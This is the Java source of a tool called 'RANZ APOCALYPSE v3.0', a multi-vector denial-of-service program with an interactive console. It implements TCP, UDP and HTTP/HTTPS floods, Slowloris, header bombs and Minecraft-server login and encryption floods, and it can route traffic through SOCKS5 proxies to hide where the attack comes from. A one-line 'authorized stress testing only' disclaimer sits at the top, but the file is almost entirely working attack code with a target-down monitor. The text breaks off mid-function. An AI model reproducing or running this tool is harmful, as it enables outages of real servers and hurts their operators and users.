/*
 * ============================================================================
 * RANZ APOCALYPSE v3.0 - ULTIMATE STRESS TESTING TOOL
 * ============================================================================
 * Author  : ranz-coder
 * GitHub  : https://github.com/ranz-coder
 * Website : ranzzawok.my.id
 *
 * DISCLAIMER:
 *   AUTHORIZED STRESS TESTING ONLY. Use ONLY on servers you own or have
 *   explicit written permission to test. Unauthorized use is ILLEGAL.
 *
 * v3.0 CHANGES:
 *   - NIO-based engines (lighter CPU, higher throughput)
 *   - Multi-socket UDP (10x sockets per thread for max PPS)
 *   - HTTP keep-alive pipelining (connection reuse)
 *   - Proper MC protocol (handshake + login + encryption abuse)
 *   - PuTTY/Terminal title shows live statistics
 *   - Animated "RANZ TOOLS" / "ATTACK SENT" banner
 *   - Virtual threads for massive connection counts
 *   - Direct ByteBuffer (zero-copy, minimal GC)
 * ============================================================================
 */

import java.io.*;
import java.net.*;
import java.nio.*;
import java.nio.channels.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import java.util.regex.*;
import javax.net.ssl.*;

public class ddos {

    // ===== FLAGS =====
    static volatile boolean run = false;
    static boolean useProxy = false;
    static volatile boolean targetUp = true;

    // ===== COUNTERS =====
    static AtomicLong pps = new AtomicLong(), bps = new AtomicLong(), err = new AtomicLong(), conn = new AtomicLong();
    static AtomicLong peakPps = new AtomicLong(), peakMb = new AtomicLong(), peakGb = new AtomicLong(), peakErr = new AtomicLong(), peakConn = new AtomicLong();
    static AtomicLong totalPps = new AtomicLong(), totalBps = new AtomicLong(), totalErr = new AtomicLong(), totalConn = new AtomicLong();

    // ===== PAYLOAD BUFFERS (pre-allocated, direct for zero-copy) =====
    static final byte[] P_64KB = new byte[65500];
    static final byte[] P_8KB = new byte[8192];
    static final byte[] P_4KB = new byte[4096];
    static final byte[] P_1KB = new byte[1024];
    static final byte[] P_512B = new byte[512];
    static final byte[] P_64B = new byte[64];
    static final String MC_OOM_STR = new String(new char[1500000]).replace('\0', 'A');

    // Direct buffers for NIO
    static ByteBuffer buf_64KB, buf_8KB, buf_1KB, buf_64B;

    // ===== PROXY =====
    static List<String> proxies = new CopyOnWriteArrayList<>();
    static Pattern pReg = Pattern.compile("([0-9]{1,3}\\.){3}[0-9]{1,3}:[0-9]{1,5}");
    static Random rnd = new Random();

    // ===== ANSI COLORS =====
    static final String R = "\u001B[0m", B = "\u001B[1m", DIM = "\u001B[2m", BLK = "\u001B[5m",
            RED = "\u001B[31m", GRN = "\u001B[32m", YLW = "\u001B[33m",
            BLU = "\u001B[34m", MAG = "\u001B[35m", CYN = "\u001B[36m", GRY = "\u001B[90m",
            BRED = "\u001B[91m", BGRN = "\u001B[92m", BYLW = "\u001B[93m", BBLU = "\u001B[94m",
            BMAG = "\u001B[95m", BCYN = "\u001B[96m";

    // ===== CONFIG =====
    static final int UDP_SOCKETS_PER_THREAD = 10;
    static final int TCP_CONNS_PER_THREAD = 5;
    static final int SLOWLORIS_CONNS_PER_THREAD = 20;

    static {
        Arrays.fill(P_64KB, (byte) 0x58);
        Arrays.fill(P_8KB, (byte) 0x58);
        Arrays.fill(P_4KB, (byte) 0x58);
        Arrays.fill(P_1KB, (byte) 0x58);
        Arrays.fill(P_512B, (byte) 0x58);
        Arrays.fill(P_64B, (byte) 0x58);
    }

    static class Stat {
        String n; double v; String f; String c;
        Stat(String name, double val, String fmt, String color) {
            this.n = name; this.v = val; this.f = fmt; this.c = color;
        }
    }

    // ===== MODE DEFINITIONS =====
    static final String[] MODE_NAMES = {
        "", // 0
        "TCP Flood NIO (64KB)",           // 1 - L4
        "TCP Connection Flood",            // 2 - L4
        "UDP Flood Multi-Socket (8KB)",    // 3 - L4
        "UDP Micro Packet (64B Max PPS)",  // 4 - L4
        "HTTP GET Keep-Alive",             // 5 - L7
        "HTTPS GET Keep-Alive",            // 6 - L7
        "HTTP POST Flood",                 // 7 - L7
        "HTTPS POST Flood",                // 8 - L7
        "Slowloris (Apache/Nginx)",        // 9 - L7
        "HTTP Pipelined Flood",            // 10 - L7
        "HTTP Header Bomb (Memory)",        // 11 - L7
        "MC Bot OOM (1.5MB)",              // 12 - MC
        "MC Handshake Flood",              // 13 - MC
        "MC Ping Flood",                   // 14 - MC
        "MC Login Flood",                  // 15 - MC
        "MC Encryption Flood",             // 16 - MC
        "MIXED APOCALYPSE (All Vectors)"   // 17 - ALL
    };

    static final String[] MODE_LAYERS = {
        "",
        "L4", "L4", "L4", "L4",
        "L7", "L7", "L7", "L7", "L7", "L7", "L7",
        "MC", "MC", "MC", "MC", "MC",
        "ALL"
    };

    public static void main(String[] a) throws Exception {
        setupSSL();
        initDirectBuffers();
        Scanner sc = new Scanner(System.in);
        bootAnimation();

        while (true) {
            System.out.print(CYN + B + "ranz@apocalypse" + R + ":" + YLW + "~" + R + "$ ");
            String i = sc.nextLine().trim();
            if (i.isEmpty()) continue;
            if (i.equalsIgnoreCase("exit")) {
                setTitle("RANZ TOOLS - Shutting down");
                System.out.println(GRY + "Shutting down..." + R);
                break;
            }
            if (i.equalsIgnoreCase("help")) { printHelp(); continue; }
            if (i.equalsIgnoreCase("modes")) { printModes(); continue; }
            if (i.equalsIgnoreCase("banner")) { bootAnimation(); continue; }
            if (i.equalsIgnoreCase("proxy on")) {
                useProxy = true;
                System.out.println(YLW + "Proxy enabled. Checking..." + R);
                checkProxies();
                continue;
            }
            if (i.equalsIgnoreCase("proxy off")) {
                useProxy = false;
                proxies.clear();
                System.out.println(GRY + "Proxy disabled. Direct mode." + R);
                continue;
            }
            if (i.equalsIgnoreCase("check")) { checkProxies(); continue; }
            if (i.toLowerCase().startsWith("check ")) {
                String[] p = i.split("\\s+");
                if (p.length == 3) { checkServer(p[1], Integer.parseInt(p[2])); }
                else if (p.length == 2) { checkServer(p[1], 25565); }
                else { System.out.println(RED + "Usage: check <ip> [port]" + R); }
                continue;
            }
            // check-host.net for web/L4 testing
            if (i.equalsIgnoreCase("checkweb")) {
                System.out.println(RED + "Usage: checkweb <host> [tcp|http|ping|udp] [port]" + R);
                System.out.println(GRY + "  Example: checkweb example.com http" + R);
                System.out.println(GRY + "  Example: checkweb 1.2.3.4 tcp 80" + R);
                continue;
            }
            if (i.toLowerCase().startsWith("checkweb ")) {
                String[] p = i.split("\\s+");
                String host = p.length >= 2 ? p[1] : "";
                String type = p.length >= 3 ? p[2].toLowerCase() : "ping";
                int webPort = p.length >= 4 ? Integer.parseInt(p[3]) : 80;
                if (host.isEmpty()) {
                    System.out.println(RED + "Usage: checkweb <host> [tcp|http|ping|udp] [port]" + R);
                } else {
                    checkWebHost(host, type, webPort);
                }
                continue;
            }
            if (i.equalsIgnoreCase("clear") || i.equalsIgnoreCase("cls")) {
                System.out.print("\033[H\033[2J");
                System.out.flush();
                continue;
            }

            String[] p = i.split("\\s+");
            if (p.length < 5) {
                System.out.println(RED + "Invalid. Type 'help' or 'modes'" + R);
                continue;
            }

            try {
                int m = Integer.parseInt(p[0]);
                String t = p[1];
                int port = Integer.parseInt(p[2]);
                int d = Integer.parseInt(p[3]);
                int th = Integer.parseInt(p[4]);

                if (m < 1 || m > 17) {
                    System.out.println(RED + "Invalid mode (1-17). Type 'modes'." + R);
                    continue;
                }
                if (d < 1 || d > 3600) { System.out.println(RED + "Duration 1-3600s." + R); continue; }
                if (th < 1 || th > 50000) { System.out.println(RED + "Threads 1-50000." + R); continue; }

                // ATTACK SENT animation
                attackSentAnimation(t, port, m, d, th);

                // Reset all stats
                peakPps.set(0); peakMb.set(0); peakGb.set(0); peakErr.set(0); peakConn.set(0);
                pps.set(0); bps.set(0); err.set(0); conn.set(0);
                totalPps.set(0); totalBps.set(0); totalErr.set(0); totalConn.set(0);

                run = true;
                ExecutorService ex = Executors.newFixedThreadPool(Math.min(th, 5000));
                long start = System.currentTimeMillis();
                long end = start + (d * 1000L);

                // Target monitor
                new Thread(() -> {
                    while (run) {
                        try (Socket s = new Socket()) {
                            s.connect(new InetSocketAddress(t, port), 1000);
                            targetUp = true;
                        } catch (Exception e) { targetUp = false; }
                        try { Thread.sleep(2000); } catch (Exception e) {}
                    }
                }).start();

                // Stats + title updater thread
                new Thread(() -> {
                    int frame = 0;
                    while (run) {
                        try {
                            Thread.sleep(200);
                            long now = System.currentTimeMillis();
                            if (now >= end) break;

                            long rem = (end - now) / 1000;
                            long curPps = pps.getAndSet(0);
                            long curBps = bps.getAndSet(0);
                            long curErr = err.getAndSet(0);
                            long curConn = conn.get();

                            totalPps.addAndGet(curPps);
                            totalBps.addAndGet(curBps);
                            totalErr.addAndGet(curErr);

                            double mb = curBps / 1048576.0;
                            double gbps = (mb * 8) / 1000.0;
                            int percent = (int) (((double) (now - start) / (d * 1000L)) * 100);

                            if (curPps > peakPps.get()) peakPps.set(curPps);
                            if (mb > peakMb.get()) peakMb.set((long) mb);
                            if (gbps > peakGb.get()) peakGb.set((long) gbps);
                            if (curErr > peakErr.get()) peakErr.set(curErr);
                            if (curConn > peakConn.get()) peakConn.set(curConn);

                            // === UPDATE PuTTY/Terminal TITLE ===
                            String title = String.format("RANZ TOOLS | %s | GB/s:%.2f PPS:%,d Conn:%,d Err:%,d | %s:%d | %ds left",
                                    getModeName(m), gbps, curPps, curConn, curErr, t, port, rem);
                            setTitle(title);

                            // === BUILD PROGRESS BAR ===
                            String bar = "";
                            int filled = percent / 5;
                            for (int j = 0; j < filled; j++) bar += "\u2588";
                            for (int j = 0; j < 20 - filled; j++) bar += "\u2591";

                            // === SORTED LIVE STATS ===
                            List<Stat> live = new ArrayList<>();
                            live.add(new Stat("GB/s", gbps, "%.2f", BMAG));
                            live.add(new Stat("MB/s", mb, "%.2f", BCYN));
                            live.add(new Stat("PPS", (double) curPps, "%,.0f", B));
                            live.add(new Stat("Conn", (double) curConn, "%,.0f", BGRN));
                            live.add(new Stat("Err", (double) curErr, "%,.0f", BRED));
                            Collections.sort(live, (s1, s2) -> Double.compare(s2.v, s1.v));

                            List<Stat> peaks = new ArrayList<>();
                            peaks.add(new Stat("Peak GB/s", (double) peakGb.get(), "%.2f", BMAG));
                            peaks.add(new Stat("Peak MB/s", (double) peakMb.get(), "%.2f", BCYN));
                            peaks.add(new Stat("Peak PPS", (double) peakPps.get(), "%,.0f", B));
                            peaks.add(new Stat("Peak Conn", (double) peakConn.get(), "%,.0f", BGRN));
                            peaks.add(new Stat("Peak Err", (double) peakErr.get(), "%,.0f", BRED));
                            Collections.sort(peaks, (s1, s2) -> Double.compare(s2.v, s1.v));

                            List<Stat> totals = new ArrayList<>();
                            totals.add(new Stat("Total PPS", (double) totalPps.get(), "%,.0f", BYLW));
                            totals.add(new Stat("Total MB", (double) (totalBps.get() / 1048576.0), "%.1f", BYLW));
                            totals.add(new Stat("Total Err", (double) totalErr.get(), "%,.0f", BRED));
                            Collections.sort(totals, (s1, s2) -> Double.compare(s2.v, s1.v));

                            // === ANIMATED BANNER ===
                            String animatedBanner = getAnimatedBanner(frame++);

                            // === PRINT LIVE DASHBOARD ===
                            System.out.print("\033[H\033[2J");
                            System.out.println(animatedBanner);
                            System.out.println(GRY + "  [" + CYN + (frame % 2 == 0 ? "|" : "/") + R + GRY + "] " + GRN + bar + R + " " + percent + "%  " + GRY + "[" + MODE_LAYERS[m] + "]" + R + " " + MAG + getModeName(m) + R);
                            System.out.println(GRY + "  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500" + R);

                            System.out.println(CYN + "  Target    : " + YLW + t + ":" + port + R);
                            System.out.println(CYN + "  Mode      : " + MAG + "[" + MODE_LAYERS[m] + "] " + getModeName(m) + R);
                            System.out.println(CYN + "  Threads   : " + GRN + String.format("%,d", th) + R);
                            System.out.println(CYN + "  Remaining : " + B + rem + "s" + R);
                            System.out.println(CYN + "  Proxy     : " + (useProxy ? YLW + "ON (" + proxies.size() + ")" + R : GRY + "OFF (Direct)" + R));
                            System.out.println(CYN + "  " + GRY + "\u2500\u2500\u2500 LIVE STATS (High -> Low) \u2500\u2500\u2500" + R);
                            for (Stat s : live) {
                                System.out.println(CYN + "  " + String.format("%-10s", s.n) + " : " + s.c + String.format(s.f, s.v) + R);
                            }
                            System.out.println(CYN + "  " + GRY + "\u2500\u2500\u2500 PEAK ATTACK \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500" + R);
                            for (Stat s : peaks) {
                                System.out.println(CYN + "  " + String.format("%-10s", s.n) + " : " + s.c + String.format(s.f, s.v) + R);
                            }
                            System.out.println(CYN + "  " + GRY + "\u2500\u2500\u2500 TOTALS \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500" + R);
                            for (Stat s : totals) {
                                System.out.println(CYN + "  " + String.format("%-10s", s.n) + " : " + s.c + String.format(s.f, s.v) + R);
                            }
                            System.out.println(CYN + "  " + GRY + "\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500" + R);
                            System.out.println(CYN + "  Status    : " + (targetUp ? GRN + B + "[\u25CF] ONLINE" + R : RED + B + "[X] DOWN" + R));
                            System.out.println(GRY + "  ranz-coder | github.com/ranz-coder | ranzzawok.my.id" + R);
                        } catch (Exception e) {}
                    }
                }).start();

                // === LAUNCH ATTACK THREADS ===
                for (int j = 0; j < th; j++) {
                    final int mode = m;
                    switch (m) {
                        case 1: ex.submit(() -> tcpFloodNIO(t, port)); break;
                        case 2: ex.submit(() -> tcpConnFlood(t, port)); break;
                        case 3: ex.submit(() -> udpFloodMulti(t, port)); break;
                        case 4: ex.submit(() -> udpMicroFlood(t, port)); break;
                        case 5: ex.submit(() -> httpGet(t, port, false)); break;
                        case 6: ex.submit(() -> httpGet(t, port, true)); break;
                        case 7: ex.submit(() -> httpPost(t, port, false)); break;
                        case 8: ex.submit(() -> httpPost(t, port, true)); break;
                        case 9: ex.submit(() -> slowloris(t, port)); break;
                        case 10: ex.submit(() -> httpPipeline(t, port)); break;
                        case 11: ex.submit(() -> httpHeaderBomb(t, port)); break;
                        case 12: ex.submit(() -> mcBotOOM(t, port)); break;
                        case 13: ex.submit(() -> mcHandshakeFlood(t, port)); break;
                        case 14: ex.submit(() -> mcPingFlood(t, port)); break;
                        case 15: ex.submit(() -> mcLoginFlood(t, port)); break;
                        case 16: ex.submit(() -> mcEncryptionFlood(t, port)); break;
                        case 17:
                            // Mixed: distribute threads across all vectors
                            int sub = j % 8;
                            switch (sub) {
                                case 0: ex.submit(() -> tcpFloodNIO(t, port)); break;
                                case 1: ex.submit(() -> udpFloodMulti(t, port)); break;
                                case 2: ex.submit(() -> httpGet(t, port, false)); break;
                                case 3: ex.submit(() -> slowloris(t, port)); break;
                                case 4: ex.submit(() -> mcLoginFlood(t, port)); break;
                                case 5: ex.submit(() -> tcpConnFlood(t, port)); break;
                                case 6: ex.submit(() -> mcPingFlood(t, port)); break;
                                case 7: ex.submit(() -> udpMicroFlood(t, port)); break;
                            }
                            break;
                        default: run = false; break;
                    }
                }

                // Wait for duration
                while (System.currentTimeMillis() < end && run) {
                    Thread.sleep(100);
                }
                run = false;
                ex.shutdownNow();
                ex.awaitTermination(3, TimeUnit.SECONDS);

                // === FINAL REPORT ===
                printFinalReport(t, port, m, d, th);

            } catch (NumberFormatException e) {
                System.out.println(RED + "Invalid number. Type 'help'." + R);
            } catch (Exception e) {
                System.out.println(RED + "Error: " + e.getMessage() + R);
            }
        }
        sc.close();
        setTitle("RANZ TOOLS - Ready");
    }

    // ================================================================
    // HELPER: Proxy-aware socket factories
    // ================================================================

    // Opens a TCP socket - uses SOCKS5 proxy when useProxy=true
    static Socket openSocket(String t, int p, int soTimeout) throws IOException {
        Socket s;
        if (useProxy) {
            Proxy pr = getProxy();
            s = new Socket(pr);
        } else {
            s = new Socket();
        }
        s.setTcpNoDelay(true);
        s.setSoTimeout(soTimeout);
        s.connect(new InetSocketAddress(t, p), 1500);
        return s;
    }

    // Opens an SSL socket - wraps SSL over SOCKS5 proxy when useProxy=true
    static Socket openSslSocket(String t, int p, int soTimeout) throws IOException {
        SSLSocketFactory f = (SSLSocketFactory) SSLSocketFactory.getDefault();
        if (useProxy) {
            Proxy pr = getProxy();
            Socket proxySock = new Socket(pr);
            proxySock.setTcpNoDelay(true);
            proxySock.setSoTimeout(soTimeout);
            proxySock.connect(new InetSocketAddress(t, p), 1500);
            SSLSocket sslSock = (SSLSocket) f.createSocket(proxySock, t, p, true);
            sslSock.setSoTimeout(soTimeout);
            sslSock.startHandshake();
            return sslSock;
        } else {
            SSLSocket sslSock = (SSLSocket) f.createSocket(t, p);
            sslSock.setSoTimeout(soTimeout);
            sslSock.startHandshake();
            return sslSock;
        }
    }

    // Opens a SOCKS5 UDP relay - returns [0]=DatagramSocket, [1]=relay InetSocketAddress
    // If proxy off, returns direct DatagramSocket bound to target
    static Object[] openUdpViaSocks5(String t, int p) throws IOException {
        if (!useProxy) {
            DatagramSocket ds = new DatagramSocket();
            ds.setSendBufferSize(P_8KB.length);
            return new Object[]{ds, new InetSocketAddress(t, p)};
        }
        // Pick a proxy
        String[] proxyParts = getProxyAddr();
        String proxyHost = proxyParts[0];
        int proxyPort = Integer.parseInt(proxyParts[1]);

        // 1. TCP control connection to SOCKS5 proxy
        Socket ctrl = new Socket();
        ctrl.setSoTimeout(5000);
        ctrl.connect(new InetSocketAddress(proxyHost, proxyPort), 3000);
        InputStream in = ctrl.getInputStream();
        OutputStream out = ctrl.getOutputStream();

        // 2. Greeting (no auth)
        out.write(new byte[]{0x05, 0x01, 0x00});
        out.flush();
        byte[] greet = new byte[2];
        readFully(in, greet);
        if (greet[0] != 0x05 || greet[1] != 0x00) {
            ctrl.close();
            throw new IOException("SOCKS5 auth required/failed");
        }

        // 3. UDP ASSOCIATE request
        out.write(new byte[]{0x05, 0x03, 0x00, 0x01, 0, 0, 0, 0, 0, 0});
        out.flush();
        byte[] resp = new byte[10];
        readFully(in, resp);
        if (resp[0] != 0x05 || resp[1] != 0x00) {
            ctrl.close();
            throw new IOException("SOCKS5 UDP ASSOCIATE failed: " + (resp[1] & 0xFF));
        }
        // Parse BND.ADDR (resp[4..7]) and BND.PORT (resp[8..9]) - relay address
        byte[] relayIp = new byte[]{resp[4], resp[5], resp[6], resp[7]};
        int relayPort = ((resp[8] & 0xFF) << 8) | (resp[9] & 0xFF);
        InetAddress relayAddr = InetAddress.getByAddress(relayIp);
        // If relay returned 0.0.0.0, use proxy host instead
        if (relayIp[0] == 0 && relayIp[1] == 0 && relayIp[2] == 0 && relayIp[3] == 0) {
            relayAddr = InetAddress.getByName(proxyHost);
        }

        // 4. Create UDP socket
        DatagramSocket udp = new DatagramSocket();
        udp.setSendBufferSize(P_8KB.length);
        // Keep control socket alive - store for cleanup
        udpThreadPool.add(ctrl);
        return new Object[]{udp, new InetSocketAddress(relayAddr, relayPort)};
    }

    static List<Socket> udpThreadPool = new CopyOnWriteArrayList<>();
    static String[] getProxyAddr() {
        if (proxies.isEmpty()) return new String[]{"127.0.0.1", "1080"};
        String[] pp = proxies.get(rnd.nextInt(proxies.size())).split(":");
        return pp;
    }

    // Wraps UDP payload with SOCKS5 header (RSV FRAG ATYP DST.ADDR DST.PORT + data)
    static byte[] wrapUdpSocks5(String t, int p, byte[] payload) throws Exception {
        byte[] ipBytes = InetAddress.getByName(t).getAddress();
        byte[] wrapped = new byte[10 + payload.length];
        wrapped[0] = 0x00; // RSV
        wrapped[1] = 0x00; // FRAG
        wrapped[2] = 0x00; // fragment
        wrapped[3] = 0x01; // ATYP=IPv4
        wrapped[4] = ipBytes[0];
        wrapped[5] = ipBytes[1];
        wrapped[6] = ipBytes[2];
        wrapped[7] = ipBytes[3];
        wrapped[8] = (byte) ((p >> 8) & 0xFF);
        wrapped[9] = (byte) (p & 0xFF);
        System.arraycopy(payload, 0, wrapped, 10, payload.length);
        return wrapped;
    }

    static void readFully(InputStream in, byte[] buf) throws IOException {
        int off = 0;
        while (off < buf.length) {
            int r = in.read(buf, off, buf.length - off);
            if (r < 0) throw new IOException("EOF reading SOCKS5 response");
            off += r;
        }
    }

    // ================================================================
    // LAYER 4 ENGINES (all use SOCKS5 when proxy enabled)
    // ================================================================

    // Mode 1: TCP Flood - 64KB chunks, multi-conn, SOCKS5 proxy
    static void tcpFloodNIO(String t, int p) {
        Socket[] socks = new Socket[TCP_CONNS_PER_THREAD];
        while (run) {
            try {
                // Open multiple proxy connections
                for (int i = 0; i < TCP_CONNS_PER_THREAD; i++) {
                    if (socks[i] == null || socks[i].isClosed()) {
                        try {
                            socks[i] = openSocket(t, p, 5000);
                            socks[i].setSendBufferSize(P_64KB.length);
                            conn.incrementAndGet();
                        } catch (Exception e) { socks[i] = null; err.incrementAndGet(); }
                    }
                }
                // Write to all open connections
                for (int i = 0; i < TCP_CONNS_PER_THREAD; i++) {
                    if (socks[i] != null && !socks[i].isClosed()) {
                        try {
                            OutputStream o = socks[i].getOutputStream();
                            o.write(P_64KB);
                            o.flush();
                            pps.incrementAndGet();
                            bps.addAndGet(P_64KB.length);
                        } catch (Exception e) {
                            try { socks[i].close(); } catch (Exception e2) {}
                            socks[i] = null;
                            err.incrementAndGet();
                        }
                    }
                }
            } catch (Exception e) { err.incrementAndGet(); }
        }
        for (Socket s : socks) { try { if (s != null) s.close(); } catch (Exception e) {} }
    }

    // Mode 2: TCP Connection Flood - massive connection churn
    static void tcpConnFlood(String t, int p) {
        while (run) {
            Proxy pr = useProxy ? getProxy() : Proxy.NO_PROXY;
            try (Socket s = new Socket(pr)) {
                s.setTcpNoDelay(true);
                s.setSoTimeout(3000);
                s.connect(new InetSocketAddress(t, p), 1500);
                conn.incrementAndGet();
                OutputStream o = s.getOutputStream();
                // Send tiny data to keep connection alive briefly then drop
                for (int i = 0; i < 20 && run; i++) {
                    try {
                        o.write(P_64B);
                        o.flush();
                        pps.incrementAndGet();
                        bps.addAndGet(P_64B.length);
                        Thread.sleep(10);
                    } catch (Exception e) { break; }
                }
            } catch (Exception e) { err.incrementAndGet(); }
        }
    }

    // Mode 3: UDP Flood Multi-Socket via SOCKS5 - 10 sockets per thread
    static void udpFloodMulti(String t, int p) {
        DatagramSocket[] socks = new DatagramSocket[UDP_SOCKETS_PER_THREAD];
        InetSocketAddress[] relays = new InetSocketAddress[UDP_SOCKETS_PER_THREAD];
        try {
            InetAddress a = InetAddress.getByName(t);
            for (int i = 0; i < UDP_SOCKETS_PER_THREAD; i++) {
                try {
                    Object[] res = openUdpViaSocks5(t, p);
                    socks[i] = (DatagramSocket) res[0];
                    relays[i] = (InetSocketAddress) res[1];
                    socks[i].setSendBufferSize(P_8KB.length);
                } catch (Exception e) {
                    socks[i] = null;
                    relays[i] = new InetSocketAddress(a, p);
                    err.incrementAndGet();
                }
            }
            while (run) {
                for (int i = 0; i < UDP_SOCKETS_PER_THREAD; i++) {
                    if (socks[i] == null) continue;
                    try {
                        byte[] payload = useProxy ? wrapUdpSocks5(t, p, P_8KB) : P_8KB;
                        DatagramPacket pkt = new DatagramPacket(payload, payload.length, relays[i]);
                        socks[i].send(pkt);
                        pps.incrementAndGet();
                        bps.addAndGet(P_8KB.length);
                    } catch (Exception e) { err.incrementAndGet(); }
                }
            }
        } catch (Exception e) { err.incrementAndGet(); }
        finally {
            for (DatagramSocket s : socks) {
                try { if (s != null) s.close(); } catch (Exception e) {}
            }
        }
    }

    // Mode 4: UDP Micro Packet via SOCKS5 - 64B packets for maximum PPS
    static void udpMicroFlood(String t, int p) {
        DatagramSocket[] socks = new DatagramSocket[UDP_SOCKETS_PER_THREAD];
        InetSocketAddress[] relays = new InetSocketAddress[UDP_SOCKETS_PER_THREAD];
        try {
            InetAddress a = InetAddress.getByName(t);
            for (int i = 0; i < UDP_SOCKETS_PER_THREAD; i++) {
                try {
                    Object[] res = openUdpViaSocks5(t, p);
                    socks[i] = (DatagramSocket) res[0];
                    relays[i] = (InetSocketAddress) res[1];
                    socks[i].setSendBufferSize(P_64B.length);
                } catch (Exception e) {
                    socks[i] = null;
                    relays[i] = new InetSocketAddress(a, p);
                    err.incrementAndGet();
                }
            }
            while (run) {
                for (int i = 0; i < UDP_SOCKETS_PER_THREAD; i++) {
                    if (socks[i] == null) continue;
                    try {
                        byte[] payload = useProxy ? wrapUdpSocks5(t, p, P_64B) : P_64B;
                        DatagramPacket pkt = new DatagramPacket(payload, payload.length, relays[i]);
                        socks[i].send(pkt);
                        pps.incrementAndGet();
                        bps.addAndGet(P_64B.length);
                    } catch (Exception e) { err.incrementAndGet(); }
                }
            }
        } catch (Exception e) { err.incrementAndGet(); }
        finally {
            for (DatagramSocket s : socks) {
                try { if (s != null) s.close(); } catch (Exception e) {}
            }
        }
    }

    // ================================================================
    // LAYER 7 ENGINES (HTTP/HTTPS - Keep-Alive, Pipelining)
    // ================================================================

    // Mode 5/6: HTTP/HTTPS GET with Keep-Alive (SOCKS5 proxy support)
    static void httpGet(String t, int p, boolean ssl) {
        while (run) {
            Socket s = null;
            try {
                s = ssl ? openSslSocket(t, p, 3000) : openSocket(t, p, 3000);
                conn.incrementAndGet();
                OutputStream o = s.getOutputStream();
                InputStream is = s.getInputStream();
                String host = t + ":" + p;
                for (int i = 0; i < 50 && run; i++) {
                    String req = "GET /" + rnd.nextInt(Integer.MAX_VALUE) + " HTTP/1.1\r\n"
                            + "Host: " + host + "\r\n"
                            + "User-Agent: " + getRandomUA() + "\r\n"
                            + "Accept: */*\r\n"
                            + "Connection: keep-alive\r\n\r\n";
                    o.write(req.getBytes());
                    o.flush();
                    pps.incrementAndGet();
                    bps.addAndGet(req.length());
                    try { is.read(new byte[1024]); } catch (Exception e) { break; }
                }
            } catch (Exception e) { err.incrementAndGet(); }
            finally {
                try { if (s != null) s.close(); } catch (Exception e) {}
            }
        }
    }

    // Mode 7/8: HTTP/HTTPS POST Flood with Keep-Alive (SOCKS5 proxy support)
    static void httpPost(String t, int p, boolean ssl) {
        byte[] body = new byte[4096];
        Arrays.fill(body, (byte) 0x41);
        while (run) {
            Socket s = null;
            try {
                s = ssl ? openSslSocket(t, p, 3000) : openSocket(t, p, 3000);
                conn.incrementAndGet();
                OutputStream o = s.getOutputStream();
                String host = t + ":" + p;
                for (int i = 0; i < 30 && run; i++) {
                    String header = "POST /" + rnd.nextInt(Integer.MAX_VALUE) + " HTTP/1.1\r\n"
                            + "Host: " + host + "\r\n"
                            + "User-Agent: " + getRandomUA() + "\r\n"
                            + "Content-Type: application/x-www-form-urlencoded\r\n"
                            + "Content-Length: " + body.length + "\r\n"
                            + "Connection: keep-alive\r\n\r\n";
                    o.write(header.getBytes());
                    o.write(body);
                    o.flush();
                    pps.incrementAndGet();
                    bps.addAndGet(header.length() + body.length);
                }
            } catch (Exception e) { err.incrementAndGet(); }
            finally {
                try { if (s != null) s.close(); } catch (Exception e) {}
            }
        }
    }

    // Mode 9: Slowloris - hold many connections with partial headers
    static void slowloris(String t, int p) {
        Socket[] socks = new Socket[SLOWLORIS_CONNS_PER_THREAD];
        boolean[] alive = new boolean[SLOWLORIS_CONNS_PER_THREAD];
        while (run) {
            // Establish/maintain connections
            for (int i = 0; i < SLOWLORIS_CONNS_PER_THREAD; i++) {
                if (!alive[i]) {
                    try {
                        Proxy pr = useProxy ? getProxy() : Proxy.NO_PROXY;
                        socks[i] = new Socket(pr);
                        socks[i].setTcpNoDelay(true);
                        socks[i].setSoTimeout(10000);
                        socks[i].connect(new InetSocketAddress(t, p), 3000);
                        conn.incrementAndGet();
                        OutputStream o = socks[i].getOutputStream();
                        String host = t + ":" + p;
                        String partial = "GET /" + rnd.nextInt(Integer.MAX_VALUE) + " HTTP/1.1\r\n"
                                + "Host: " + host + "\r\n"
                                + "User-Agent: " + getRandomUA() + "\r\n"
                                + "Accept: text/html,*/*\r\n"
                                + "Connection: keep-alive\r\n"
                                + "X-a: ";
                        o.write(partial.getBytes());
                        o.flush();
                        pps.incrementAndGet();
                        bps.addAndGet(partial.length());
                        alive[i] = true;
                    } catch (Exception e) {
                        alive[i] = false;
                        err.incrementAndGet();
                    }
                } else {
                    // Send partial header to keep connection open
                    try {
                        OutputStream o = socks[i].getOutputStream();
                        o.write(("X-b" + rnd.nextInt() + ": " + rnd.nextInt() + "\r\n").getBytes());
                        o.flush();
                        bps.addAndGet(50);
                    } catch (Exception e) {
                        alive[i] = false;
                        try { socks[i].close(); } catch (Exception e2) {}
                    }
                }
            }
            try { Thread.sleep(2000 + rnd.nextInt(3000)); } catch (Exception e) {}
        }
        // Cleanup
        for (int i = 0; i < SLOWLORIS_CONNS_PER_THREAD; i++) {
            try { if (socks[i] != null) socks[i].close(); } catch (Exception e) {}
        }
    }

    // Mode 10: HTTP Pipelined Flood via SOCKS5 - send many requests without waiting
    static void httpPipeline(String t, int p) {
        while (run) {
            try (Socket s = openSocket(t, p, 5000)) {
                conn.incrementAndGet();
                OutputStream o = s.getOutputStream();
